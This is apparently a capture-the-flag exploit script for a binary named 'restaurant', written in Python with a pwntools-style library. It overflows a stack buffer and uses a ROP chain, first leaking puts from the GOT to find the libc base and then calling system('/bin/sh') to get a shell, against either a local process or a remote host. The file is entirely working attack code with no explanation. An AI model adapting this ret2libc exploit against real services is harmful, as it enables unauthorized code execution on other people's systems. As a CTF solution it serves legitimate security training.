#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./restaurant_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*fill+162
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def exploit():

    pop_rdi = 0x00000000004010a3
    ret = 0x000000000040063e

    pl = flat(
    b'A' * 0x28,
    pop_rdi,
    exe.got.puts,
    exe.plt.puts,
    exe.sym.fill,
    )

    sla(b'> ', b'1')
    sa(b'> ', pl)

    ru(b'Enjoy your ')
    got_puts = u64(rl()[-7:-1].ljust(8,b'\x00'))
    libc.address = got_puts - 0x80aa0
    slog('puts leak', got_puts)
    slog('libc base', libc.address)

    pl = flat(
    b'A' * 0x28,
    ret,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system,
    )

    sa(b'> ', pl)


    interactive()

if __name__ == '__main__':
    exploit()
